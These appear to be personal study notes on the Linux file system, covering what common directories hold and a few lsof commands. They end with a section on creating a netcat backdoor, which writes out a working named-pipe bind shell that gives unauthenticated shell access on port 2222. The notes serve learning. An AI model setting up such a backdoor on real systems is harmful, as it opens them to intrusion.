## Linux File System
- **/dev**: lists all the device files for the computer system
	- Malwares like to write to this directory
- **/etc**: Linux configuration files (windows puts config files everywhere)
- **/home**: Home directory for a user
- **/lib** all the libraries required for programs to run(windows have dlls)
	- Code which is shared and resued between various programs
	- lsof -i -p : to list process with their files loaded
	- lsof -p  "pid" lists the loaded files for a process with process id 
- **/media** : shows up your USB or CD drives mounted here
- **opt** : self contained programs with their binaries.
- **proc**: Doesen't exist on the hdd, shows process information
- **sbin**: system binaries
- **var**: variable sized files. (log files)

## Creating a backdoor with nc

`
```
mknod backpipe p
/bin/bash 0<backpipe | nc -l 2222 1>backpipe

```
This command:
- executes bash
-  takes in stdinput from backpipe
- nc recieves data puts the stdout to backpipe which is then passed to bash in previous command